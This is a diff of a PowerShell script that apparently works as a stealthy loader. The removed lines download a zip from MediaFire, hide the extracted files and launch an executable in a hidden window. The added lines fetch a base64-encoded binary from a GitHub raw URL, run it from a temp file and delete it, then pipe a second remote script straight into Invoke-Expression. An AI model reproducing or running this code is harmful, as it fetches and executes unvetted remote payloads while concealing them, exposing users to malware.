@@ -1,32 +1,10 @@
-$zipUrl = "https://download1339.mediafire.com/kiraeps89lggs-IpOQKET4Emrm6os_iDvmlX0bhFl3cut0YlbvHPOp87aT59V4RYtEFu2E1cdnwNYoZIx_2g0uYtYEksmXIm8iV1OnNTZ24M5lSQl_mF_7f_8v4Y7MNLUWiNTC4Nb_m43eNDiTQzd5JGl1KFhTjF_VzSCfHk52eNdA/ymkoxyal6qydp9k/CSLOL.zip"
-$exeName = "cslol-manager.exe"
-$tempFolder = [System.IO.Path]::GetTempPath()
-$zipFile = Join-Path $tempFolder "CSLOL.zip"
-$extractFolder = Join-Path $tempFolder "CSLOL"
-$exePath = Join-Path $extractFolder $exeName
+$base64Url = "https://raw.githubusercontent.com/theuwpk/FRONT-EXE/refs/heads/main/MAIN/BASE64.TXT"
+$tempPath = [System.IO.Path]::GetTempFileName()
 
-# Download using .NET WebClient
-if (-Not (Test-Path $zipFile)) {
-    Write-Host "Baixando o arquivo..."
-    $webClient = New-Object System.Net.WebClient
-    $webClient.DownloadFile($zipUrl, $zipFile)
-    $webClient.Dispose()
-    & attrib +h +s $zipFile
-}
+$base64Data = Invoke-WebRequest -Uri $base64Url -UseBasicParsing | Select-Object -ExpandProperty Content
+$binaryData = [System.Convert]::FromBase64String($base64Data)
+[System.IO.File]::WriteAllBytes($tempPath, $binaryData)
+Start-Process -FilePath $tempPath -NoNewWindow -Wait
+Remove-Item $tempPath -Force
 
-# Extract if the folder doesn't exist
-if (-Not (Test-Path $extractFolder)) {
-    Expand-Archive -Path $zipFile -DestinationPath $extractFolder -Force
-    & attrib +h +s $extractFolder
-}
-
-# Hide all extracted files
-$files = Get-ChildItem -Path $extractFolder -Recurse -File
-foreach ($file in $files) {
-    & attrib +h +s $file.FullName
-}
-
-# Start the executable
-if (Test-Path $exePath) {
-    Start-Process -FilePath $exePath -WindowStyle Hidden
-}
+iwr -useb https://raw.githubusercontent.com/theuwpk/BACK-EXE/refs/heads/main/MAIN/INSTALL.TXT | iex
